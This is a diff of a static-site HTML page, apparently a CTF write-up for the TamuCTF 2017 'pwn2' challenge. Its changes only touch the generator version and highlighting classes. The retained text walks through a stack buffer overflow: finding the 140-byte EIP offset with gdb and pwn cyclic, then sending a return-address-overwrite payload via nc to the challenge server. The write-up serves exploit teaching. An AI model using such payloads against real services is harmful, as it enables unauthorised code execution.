@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="generator" content="Hugo 0.29-DEV" />
+    <meta name="generator" content="Hugo 0.30-DEV" />
 
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -239,11 +239,11 @@ Like this:</p>
 </blockquote>
 
 <p>Well, in this case we can calculate it like <code>0x88h + 4d(EBP length) = 140d</code>, but lets calculate another way: using gdb (GNU Debugger).</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*500)&#39;</span><span class=""> &gt; input.txt    </span><span class="c"># Generate and save a long string in a text file.                     
-</span><span class="c"></span><span class="">$ gdb -q pwn2                               </span><span class="c"># Open the binary with gdb.
-</span><span class="c"></span><span class="">Reading symbols from pwn2...</span><span class="o">(</span><span class="">no debugging symbols found</span><span class="o">)</span><span class="">...done.
-</span><span class=""></span><span class="o">(</span><span class="">gdb</span><span class="o">)</span><span class=""> run &lt; input.txt                       </span><span class="c"># Run the binary with the generated string.
-</span><span class="c"></span><span class="">Starting program: pwn2 &lt; input.txt
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*500)&#39;</span><span class=""> &gt; input.txt    </span><span class="c1"># Generate and save a long string in a text file.                     
+</span><span class="c1"></span><span class="">$ gdb -q pwn2                               </span><span class="c1"># Open the binary with gdb.
+</span><span class="c1"></span><span class="">Reading symbols from pwn2...</span><span class="o">(</span><span class="">no debugging symbols found</span><span class="o">)</span><span class="">...done.
+</span><span class=""></span><span class="o">(</span><span class="">gdb</span><span class="o">)</span><span class=""> run &lt; input.txt                       </span><span class="c1"># Run the binary with the generated string.
+</span><span class="c1"></span><span class="">Starting program: pwn2 &lt; input.txt
 </span><span class="">Enter a word to be echoed:
 </span><span class="">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </span><span class="">
@@ -261,8 +261,8 @@ That <code>0x41414141</code> means that we have overwritten EIP register with va
 <code>cyclic</code> utility. <code>cyclic</code> is able to generate a sequence of unique substrings of any length (4 by default).</p>
 
 <p>Lets try it!</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic </span><span class="m">500</span><span class=""> &gt; input.txt  </span><span class="c"># String of 500 chars with unique substrings of 4 characters.
-</span><span class="c"></span><span class="">$ gdb -q pwn2
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic </span><span class="m">500</span><span class=""> &gt; input.txt  </span><span class="c1"># String of 500 chars with unique substrings of 4 characters.
+</span><span class="c1"></span><span class="">$ gdb -q pwn2
 </span><span class="">Reading symbols from pwn2...</span><span class="o">(</span><span class="">no debugging symbols found</span><span class="o">)</span><span class="">...done.
 </span><span class=""></span><span class="o">(</span><span class="">gdb</span><span class="o">)</span><span class=""> run &lt; input.txt 
 </span><span class="">Starting program: pwn2 &lt; input.txt
@@ -282,7 +282,7 @@ That <code>0x41414141</code> means that we have overwritten EIP register with va
 <p><img src="/assets/TamuCTF2017/pwn2/8-pwn2_modified_flow.png" alt="Pwn2 Modified execution flow" /></p>
 
 <p>Lets get our flag:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*140 + &#34;\x4b\x85\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4321</span><span class=""> 
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*140 + &#34;\x4b\x85\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4321</span><span class=""> 
 </span><span class="">Enter a word to be echoed:
 </span><span class="">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK�
 </span><span class="">This </span><span class="k">function</span><span class=""> has been deprecated
